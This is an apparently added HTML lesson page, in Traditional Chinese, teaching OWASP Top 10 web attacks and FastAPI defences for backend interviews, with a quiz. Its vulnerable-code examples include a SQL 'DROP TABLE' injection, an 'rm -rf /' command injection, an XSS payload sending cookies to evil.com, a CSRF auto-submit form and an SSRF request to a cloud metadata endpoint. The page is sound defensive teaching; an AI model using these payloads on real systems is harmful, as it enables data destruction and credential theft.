@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lesson 0006：資安基礎 — OWASP Top 10 與常見攻擊防禦</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+</head>
+<body>
+
+<h1>🛡 資安基礎 — OWASP Top 10 與常見攻擊防禦</h1>
+
+<div class="lesson-meta">
+  <span>Lesson 0006</span>
+  <span>·</span>
+  <span>⏱ ~25 min</span>
+  <span>·</span>
+  <span class="badge">security</span>
+  <span>·</span>
+  <span>← <a href="0005-authentication-authorization.html">Lesson 0005</a></span>
+</div>
+
+<h2>你寫的 API 可能有洞</h2>
+
+<p>
+  鑑權做完了，token 也發了——這樣夠安全嗎？完全不夠。
+  後端面試中，資安題是區分「會寫 code」和「有經驗的工程師」的分水嶺。
+  本課聚焦在<strong>最常見的五種 Web 攻擊</strong>以及如何在 FastAPI 中防禦。
+</p>
+
+<div class="callout tip">
+  <strong>🎯 本課目標：</strong>能說出 OWASP Top 5 攻擊的原理和防禦方式，
+  並在你的 FastAPI 程式碼中實際應用這些防禦策略。
+</div>
+
+<h2>OWASP Top 10 是什麼？</h2>
+
+<p>
+  <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP</a>（Open Web Application Security Project）
+  每 3-4 年發布一次「十大 Web 應用安全風險」，是業界公認的資安標準。
+  面試中你不需要背出全部 10 個，但<strong>前 5 個必須能清楚解釋</strong>。
+</p>
+
+<div class="card">
+  <h3>2021 OWASP Top 10 快速概覽</h3>
+  <ol>
+    <li><strong>Broken Access Control</strong> — 權限控管失效（🏆 第一名）</li>
+    <li><strong>Cryptographic Failures</strong> — 加密失敗（資料外洩）</li>
+    <li><strong>Injection</strong> — 注入攻擊（SQL、OS command）</li>
+    <li><strong>Insecure Design</strong> — 不安全的設計</li>
+    <li><strong>Security Misconfiguration</strong> — 安全設定錯誤</li>
+    <li>Vulnerable Components — 過時/有漏洞的套件</li>
+    <li>Auth Failures — 認證機制失敗</li>
+    <li>Software & Data Integrity Failures — 軟體與資料完整性失效</li>
+    <li>Logging & Monitoring Failures — 日誌與監控不足</li>
+    <li>SSRF — 伺服器端請求偽造</li>
+  </ol>
+</div>
+
+<h2>🐛 攻擊一：Injection（注入攻擊）</h2>
+
+<p>OWASP 長年冠軍（直到 2021 被 Broken Access Control 取代）。原理：<strong>把惡意程式碼混在使用者輸入中，讓伺服器誤以為是指令。</strong></p>
+
+<h3>SQL Injection — 經典範例</h3>
+
+<pre><code class="language-python"># 🚨 危險寫法：直接把使用者輸入串進 SQL
+user_input = "'; DROP TABLE users; --"
+query = f"SELECT * FROM users WHERE name = '{user_input}'"
+# 結果：SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
+
+# ✅ 安全寫法：參數化查詢
+query = "SELECT * FROM users WHERE name = :name"
+result = db.execute(query, {"name": user_input})</code></pre>
+
+<h3>NoSQL Injection — Firebase / MongoDB 也要小心</h3>
+
+<pre><code class="language-python"># 🚨 危險：使用者可以傳 {"$ne": ""} 繞過密碼檢查
+user_input = {"username": "admin", "password": {"$ne": ""}}
+db.collection("users").where(user_input)  # 永遠匹配！
+
+# ✅ 安全：明確驗證輸入型別
+if not isinstance(password, str):
+    raise HTTPException(400, "Invalid password type")</code></pre>
+
+<div class="callout warn">
+  <strong>⚠️ 你用 Firebase 要注意：</strong>Firebase Firestore 雖然不會執行 SQL，但依然可能被 NoSQL injection 攻擊。
+  關鍵防禦是<strong>嚴格驗證輸入型別</strong>——確保 password 是 string、age 是 int。
+</div>
+
+<h3>Command Injection</h3>
+
+<pre><code class="language-python"># 🚨 危險
+os.system(f"ping {user_input}")   # user_input = "8.8.8.8; rm -rf /"
+
+# ✅ 安全：用 subprocess 並傳遞參數列表
+subprocess.run(["ping", user_input], shell=False)  # shell=False 是關鍵</code></pre>
+
+<h2>🎭 攻擊二：XSS（跨站腳本攻擊）</h2>
+
+<p>把惡意 JavaScript 注入網頁，讓它在<strong>其他使用者</strong>的瀏覽器中執行。</p>
+
+<pre><code class="language-python">// 🚨 如果你直接渲染使用者輸入的內容：
+// 使用者留言："&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;"
+// 其他使用者打開頁面 → cookie 被偷 → 攻擊者以你的身分登入
+
+// ✅ 防禦：永遠 escape HTML
+from markupsafe import escape
+safe_content = escape(user_comment)
+// 結果：&amp;lt;script&amp;gt;... → 顯示為純文字，不會被執行</code></pre>
+
+<div class="card">
+  <h3>XSS 的三種類型</h3>
+  <table style="width:100%; border-collapse:collapse; font-size:0.9rem;">
+    <tr style="border-bottom:1px solid var(--border);">
+      <th style="text-align:left; padding:0.4rem 0.5rem;">類型</th>
+      <th style="text-align:left; padding:0.4rem 0.5rem;">攻擊方式</th>
+      <th style="text-align:left; padding:0.4rem 0.5rem;">防禦</th>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">Stored</td>
+      <td style="padding:0.4rem 0.5rem;">惡意腳本存在資料庫中</td>
+      <td style="padding:0.4rem 0.5rem;">輸出編碼</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">Reflected</td>
+      <td style="padding:0.4rem 0.5rem;">惡意腳本在 URL 參數中</td>
+      <td style="padding:0.4rem 0.5rem;">輸入驗證 + 輸出編碼</td>
+    </tr>
+    <tr>
+      <td style="padding:0.4rem 0.5rem;">DOM-based</td>
+      <td style="padding:0.4rem 0.5rem;">純前端漏洞（innerHTML）</td>
+      <td style="padding:0.4rem 0.5rem;">避免 innerHTML、用 textContent</td>
+    </tr>
+  </table>
+</div>
+
+<div class="callout">
+  <strong>💡 FastAPI 後端的責任：</strong>雖然 XSS 主要影響前端，但後端必須確保<strong>儲存的資料被正確清理</strong>，
+  並且在 response header 中加上 <code>Content-Security-Policy</code> 來限制瀏覽器能執行哪些 script。
+</div>
+
+<h2>🎯 攻擊三：CSRF（跨站請求偽造）</h2>
+
+<p>攻擊者讓<strong>已登入的使用者</strong>在不知情的情況下發出惡意請求。</p>
+
+<div class="diagram">
+<pre><code class="language-plaintext">┌── CSRF 攻擊示意 ────────────────────────────────────┐
+│                                                       │
+│  ① 你登入了 bank.com，cookie 中有 session             │
+│                                                       │
+│  ② 你點了 email 中一個看似無害的連結，                │
+│     打開了 evil.com                                   │
+│                                                       │
+│  ③ evil.com 的網頁中有：                              │
+│     &lt;form action="https://bank.com/transfer"&gt;       │
+│       &lt;input name="to" value="attacker"&gt;            │
+│       &lt;input name="amount" value="10000"&gt;           │
+│     &lt;/form&gt;                                          │
+│     &lt;script&gt;document.forms[0].submit()&lt;/script&gt;     │
+│                                                       │
+│  ④ 瀏覽器自動帶上你的 bank.com cookie                │
+│     → $10,000 轉到攻擊者帳戶                          │
+└──────────────────────────────────────────────────────┘</code></pre>
+</div>
+
+<h3>防禦 CSRF 的方式</h3>
+
+<pre><code class="language-python"># ✅ 方式一：CSRF Token（傳統 SSR 方案）
+# 伺服器生成一個隨機 token，放在 form 隱藏欄位中
+# 提交時檢查 token 是否匹配
+
+# ✅ 方式二：SameSite Cookie（現代方案）
+# Set-Cookie: session_id=abc; SameSite=Strict
+# → 瀏覽器不會在跨站請求中帶上這個 cookie
+
+# ✅ 方式三：檢查 Origin/Referer Header（API 方案）
+from fastapi import Request, HTTPException
+
+def csrf_check(request: Request):
+    allowed = {"https://yourfrontend.com"}
+    origin = request.headers.get("origin")
+    if not origin or origin not in allowed:
+        raise HTTPException(status_code=403)
+
+# ✅ 方式四：如果你的 API 用 JWT（不靠 cookie）——天然免疫 CSRF
+# CSRF 是利用瀏覽器自動帶 cookie 的特性，
+# JWT 存在 Authorization header 中，瀏覽器不會自動帶 → 安全</code></pre>
+
+<div class="callout tip">
+  <strong>🔑 面試加分點：</strong>「我們用 JWT + Authorization header，而不是 cookie，所以天生不受 CSRF 攻擊。
+  但如果產品有 cookie（如 refresh token），我們會加 <code>SameSite=Strict</code>。」
+</div>
+
+<h2>🔓 攻擊四：Broken Access Control（權限失效）</h2>
+
+<p>2021 年 OWASP 新科冠軍。簡單說就是：<strong>沒有正確檢查「這個人能不能做這件事」。</strong></p>
+
+<pre><code class="language-python"># 🚨 典型漏洞：只檢查登入，沒檢查「這筆資料是不是你的」
+@app.get("/orders/{order_id}")
+async def get_order(order_id: int, user = Depends(get_current_user)):
+    order = db.get_order(order_id)  # ← 任何登入者都能看任何人的訂單！
+    return order
+
+# ✅ 正確做法：驗證所有權
+@app.get("/orders/{order_id}")
+async def get_order(order_id: int, user = Depends(get_current_user)):
+    order = db.get_order(order_id)
+    if order.user_id != user.user_id:     # ← 檢查這筆訂單是否屬於你
+        raise HTTPException(status_code=403, detail="Access denied")
+    return order
+
+# 🚨 另一個經典漏洞：IDOR（不安全的直接物件引用）
+# GET /users/1 → 回傳你的資料
+# GET /users/2 → 回傳別人的資料！？ ← IDOR！
+
+# ✅ 解法：不要用 sequential ID，改用 UUID
+# GET /users/550e8400-e29b-41d4-a716-446655440000
+# 或者永遠檢查所有權</code></pre>
+
+<div class="callout warn">
+  <strong>⚠️ Broken Access Control 為何是第一名？</strong>因為它太常見了——每個端點、每個操作都要檢查權限，
+  只要漏一個地方就是漏洞。而且它不是「技術問題」，是<strong>開發流程問題</strong>——沒有在每個端點寫權限檢查。
+</div>
+
+<h2>🤖 攻擊五：SSRF（伺服器端請求偽造）</h2>
+
+<p>讓伺服器發出攻擊者指定的請求。當你的後端會根據使用者輸入去抓取 URL 時，這就是 SSRF 的入口。</p>
+
+<pre><code class="language-python"># 🚨 漏洞：使用者可以讓你的伺服器去讀內部檔案
+@app.post("/fetch-url")
+async def fetch_url(url: str):
+    resp = requests.get(url)  # url = "http://169.254.169.254/latest/meta-data/"
+    return resp.text          # ↑ AWS metadata endpoint → 拿到 IAM credentials！
+
+# ✅ 防禦：白名單 + 協定限制
+import ipaddress
+from urllib.parse import urlparse
+
+ALLOWED_HOSTS = {"api.example.com", "trusted-cdn.com"}
+
+def is_safe_url(url: str) -> bool:
+    parsed = urlparse(url)
+    if parsed.scheme not in ("https",):  # 只允許 HTTPS
+        return False
+    if parsed.hostname not in ALLOWED_HOSTS:  # hostname 白名單
+        return False
+    # 防止 DNS rebinding：解析成 IP 後再檢查是不是內網
+    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
+    return not ip.is_private  # 禁止內網 IP</code></pre>
+
+<h2>🛡 防禦速查表：在你的 FastAPI 中要做的事</h2>
+
+<div class="card">
+  <table style="width:100%; border-collapse:collapse; font-size:0.88rem;">
+    <tr style="border-bottom:1px solid var(--border);">
+      <th style="text-align:left; padding:0.4rem 0.5rem;">威脅</th>
+      <th style="text-align:left; padding:0.4rem 0.5rem;">FastAPI 防禦措施</th>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">SQL Injection</td>
+      <td style="padding:0.4rem 0.5rem;">用 ORM（SQLAlchemy）或參數化查詢，永遠不要 f-string 串 SQL</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">XSS</td>
+      <td style="padding:0.4rem 0.5rem;">輸出編碼、CSP header、<code>markupsafe.escape()</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">CSRF</td>
+      <td style="padding:0.4rem 0.5rem;">JWT 天生免疫；cookie 場景加 SameSite=Strict</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">Broken Access</td>
+      <td style="padding:0.4rem 0.5rem;">每個端點檢查所有權、用 UUID 而非 sequential ID</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">SSRF</td>
+      <td style="padding:0.4rem 0.5rem;">URL hostname 白名單、禁止內網 IP、只允許 HTTPS</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">Rate Limiting</td>
+      <td style="padding:0.4rem 0.5rem;">slowapi 套件、Nginx limit_req、API Gateway 層限流</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:0.4rem 0.5rem;">機密外洩</td>
+      <td style="padding:0.4rem 0.5rem;">SECRET_KEY 用環境變數、.env 不 commit、密碼用 bcrypt</td>
+    </tr>
+    <tr>
+      <td style="padding:0.4rem 0.5rem;">Security Headers</td>
+      <td style="padding:0.4rem 0.5rem;">加 middleware 自動附上 HSTS、CSP、X-Frame-Options、X-Content-Type-Options</td>
+    </tr>
+  </table>
+</div>
+
+<h2>🔰 練習</h2>
+
+<div class="quiz" id="quiz6">
+
+  <div class="quiz-question">
+    <p>Q1. SQL Injection 最有效的防禦方法是什麼？</p>
+    <div class="quiz-options">
+      <label class="quiz-option"><input type="radio" name="q1" value="0"> 過濾使用者輸入中的單引號</label>
+      <label class="quiz-option"><input type="radio" name="q1" value="1"> 使用參數化查詢（parameterized query），讓資料和指令徹底分離</label>
+      <label class="quiz-option"><input type="radio" name="q1" value="2"> 使用 HTTPS 加密所有請求</label>
+      <label class="quiz-option"><input type="radio" name="q1" value="3"> 限制 SQL 查詢的字串長度</label>
+    </div>
+    <div class="quiz-feedback" id="fb-q1"></div>
+  </div>
+
+  <div class="quiz-question">
+    <p>Q2. 為什麼使用 JWT（存在 Authorization header）可以天然免疫 CSRF？</p>
+    <div class="quiz-options">
+      <label class="quiz-option"><input type="radio" name="q2" value="0"> JWT 的簽名機制會自動阻擋跨站請求</label>
+      <label class="quiz-option"><input type="radio" name="q2" value="1"> CSRF 利用的是瀏覽器自動帶 cookie 的行為；JWT 存在 header 中，瀏覽器不會自動附加，攻擊者無法讓受害者的瀏覽器發出帶有正確 token 的請求</label>
+      <label class="quiz-option"><input type="radio" name="q2" value="2"> JWT 的過期時間很短，CSRF 攻擊來不及執行</label>
+      <label class="quiz-option"><input type="radio" name="q2" value="3"> JWT 使用了 SameSite 屬性</label>
+    </div>
+    <div class="quiz-feedback" id="fb-q2"></div>
+  </div>
+
+  <div class="quiz-question">
+    <p>Q3. IDOR（Insecure Direct Object Reference）是以下哪種攻擊的典型例子？</p>
+    <div class="quiz-options">
+      <label class="quiz-option"><input type="radio" name="q3" value="0"> SQL Injection</label>
+      <label class="quiz-option"><input type="radio" name="q3" value="1"> Cross-Site Scripting (XSS)</label>
+      <label class="quiz-option"><input type="radio" name="q3" value="2"> Broken Access Control</label>
+      <label class="quiz-option"><input type="radio" name="q3" value="3"> Server-Side Request Forgery (SSRF)</label>
+    </div>
+    <div class="quiz-feedback" id="fb-q3"></div>
+  </div>
+
+  <div class="quiz-question">
+    <p>Q4. 你寫了一個端點讓使用者輸入 URL，後端會去 fetch 那個 URL 的內容。最該擔心什麼？</p>
+    <div class="quiz-options">
+      <label class="quiz-option"><input type="radio" name="q4" value="0"> 使用者輸入的 URL 太長導致伺服器當機</label>
+      <label class="quiz-option"><input type="radio" name="q4" value="1"> SSRF——攻擊者可以讓你的伺服器去讀取內網資源（如雲端 metadata endpoint），洩漏機密資訊</label>
+      <label class="quiz-option"><input type="radio" name="q4" value="2"> 使用者會偷走你的 CSS 樣式表</label>
+      <label class="quiz-option"><input type="radio" name="q4" value="3"> URL 中的特殊字元會破壞 JSON 格式</label>
+    </div>
+    <div class="quiz-feedback" id="fb-q4"></div>
+  </div>
+
+  <button id="quiz6-submit" style="
+    margin-top: 1rem; padding: 0.6rem 1.5rem;
+    background: var(--accent); color: #0f1117; border: none;
+    border-radius: 6px; font-size: 0.95rem; cursor: pointer;
+    font-weight: 600;
+  ">檢查答案</button>
+</div>
+
+<div class="summary-box">
+  <h3>📋 本課重點摘要</h3>
+  <ol>
+    <li><strong>SQL/NoSQL Injection</strong>：參數化查詢、嚴格的輸入型別檢查——永遠不要拼接使用者輸入。</li>
+    <li><strong>XSS</strong>：輸出編碼（escape）、CSP header。後端要確保儲存的資料在輸出時是安全的。</li>
+    <li><strong>CSRF</strong>：JWT 天生免疫；cookie 方案加 SameSite=Strict。</li>
+    <li><strong>Broken Access Control</strong>：OWASP #1——每個端點都要檢查所有權，不要只檢查登入。</li>
+    <li><strong>SSRF</strong>：使用者輸入的 URL 要先過 hostname 白名單、禁止內網 IP。</li>
+    <li><strong>Security Headers</strong>：加一個 middleware 自動附上 HSTS、CSP、X-Frame-Options——一行 code，大幅提升安全。</li>
+  </ol>
+</div>
+
+<div class="card">
+  <h3>🎤 面試回答模板：「你寫 API 時會注意哪些安全問題？」</h3>
+  <p>
+    <em>「我會從 OWASP Top 10 的角度來思考。最重要的是 Broken Access Control——確保每個端點不僅檢查使用者是否登入，
+    還要檢查該使用者是否有權限存取該資源（例如訂單是否屬於他）。其次是 Injection——永遠使用參數化查詢或 ORM，
+    不拼接 SQL。在 API 設計上，我們用 JWT + Authorization header，天然免疫 CSRF。
+    對於 SSRF，如果有 fetch 外部 URL 的功能，必須做 hostname 白名單和內網 IP 過濾。
+    另外我會在 middleware 加上 security headers（HSTS、CSP、X-Frame-Options），這是成本最低但效果最好的防禦之一。」</em>
+  </p>
+</div>
+
+<h2>📚 延伸閱讀</h2>
+<ul>
+  <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 官方頁面</a> — 每個風險都有詳細的說明、攻擊範例和防禦指南</li>
+  <li><a href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a> — 各種安全主題的速查表，面試前翻一遍很有用</li>
+  <li><a href="https://fastapi.tiangolo.com/advanced/security/" target="_blank">FastAPI: Advanced Security</a> — 官方進階安全指南</li>
+  <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy</a> — 免費的互動式 Web 安全實驗室，想要實戰練習的最佳選擇</li>
+</ul>
+
+<div class="callout">
+  <strong>🎓 六堂課完成！</strong>你已經從 HTTP 請求生命週期開始，一路學到反向代理、API 網關、鑑權系統和資安防禦。
+  這是後端面試中最核心的知識體系。接下來你可以：<br>
+  • 回去複習任何一堂課的測驗<br>
+  • 針對某個主題深入討論<br>
+  • 讓我和你做一次模擬面試<br>
+  • 說「下一課」繼續延伸其他主題（資料庫、快取、容器化、系統設計）
+</div>
+
+<nav class="footer-nav">
+  <a href="0005-authentication-authorization.html">← 上一課：鑑權系統</a>
+  <a href="0001-http-request-lifecycle.html">回到第一課 →</a>
+</nav>
+
+<script>
+const ANSWERS = { q1: 1, q2: 1, q3: 2, q4: 1 };
+const FEEDBACK = {
+  q1: { correct: '✅ 正確！參數化查詢讓資料（使用者輸入）和指令（SQL 語法）徹底分離，這比任何黑名單過濾都有效。ORM 底層也是用參數化查詢。', wrong: '❌ 過濾單引號是不夠的——攻擊者可以用各種編碼繞過。正確做法是參數化查詢，讓資料和指令徹底分離。' },
+  q2: { correct: '✅ 正確！CSRF 的核心是「瀏覽器自動帶 cookie」。JWT 存在 Authorization header 中，瀏覽器的同源政策不會自動附加自訂 header，所以攻擊者無法偽造。', wrong: '❌ CSRF 利用的是瀏覽器自動帶 cookie 的特性。JWT 存在 Authorization header 中，瀏覽器不會自動附加這個 header，所以跨站請求中不會帶有 token。' },
+  q3: { correct: '✅ 正確！IDOR（如 GET /users/2 就能看別人資料）是 Broken Access Control 的經典案例——沒有檢查「你有沒有權限看這筆資料」。', wrong: '❌ IDOR 是一種授權失效。當你可以透過改 URL 中的 ID 來存取別人的資源時，就是 Broken Access Control（OWASP #1）。' },
+  q4: { correct: '✅ 正確！這是典型的 SSRF 入口。雲端環境中，<code>169.254.169.254</code> 是 metadata service 的 IP，攻擊者可以從這裡拿到 IAM credentials、SSH keys 等機密。', wrong: '❌ 讓使用者指定 URL 讓伺服器去抓取，最大的風險是 SSRF。特別是雲端環境中，攻擊者可以讓伺服器去讀 <code>169.254.169.254</code>（metadata endpoint）取得機密。' }
+};
+
+document.getElementById('quiz6-submit').addEventListener('click', () => {
+  let score = 0;
+  for (const [q, correctIdx] of Object.entries(ANSWERS)) {
+    const selected = document.querySelector(`input[name="${q}"]:checked`);
+    const fb = document.getElementById(`fb-${q}`);
+    const options = document.querySelectorAll(`input[name="${q}"]`);
+    options.forEach(opt => opt.parentElement.classList.remove('correct', 'wrong'));
+    if (!selected) {
+      fb.innerHTML = '⚠️ 請選擇一個答案。';
+      fb.className = 'quiz-feedback wrong show';
+      continue;
+    }
+    const chosen = parseInt(selected.value);
+    if (chosen === correctIdx) {
+      score++;
+      selected.parentElement.classList.add('correct');
+      fb.innerHTML = FEEDBACK[q].correct;
+      fb.className = 'quiz-feedback correct show';
+    } else {
+      selected.parentElement.classList.add('wrong');
+      options[correctIdx].parentElement.classList.add('correct');
+      fb.innerHTML = FEEDBACK[q].wrong;
+      fb.className = 'quiz-feedback wrong show';
+    }
+    options.forEach(opt => { opt.disabled = true; });
+  }
+  const total = Object.keys(ANSWERS).length;
+  const btn = document.getElementById('quiz6-submit');
+  if (score === total) {
+    btn.textContent = `🎉 全對！(${score}/${total})`;
+    btn.style.background = 'var(--success)'; btn.style.color = '#0f1117';
+  } else {
+    btn.textContent = `得分：${score}/${total} — 複習後再試一次`;
+    btn.style.background = 'var(--warning)'; btn.style.color = '#0f1117';
+  }
+  btn.disabled = true;
+});
+</script>
+
+<script>hljs.highlightAll();</script>
+</body>
+</html>
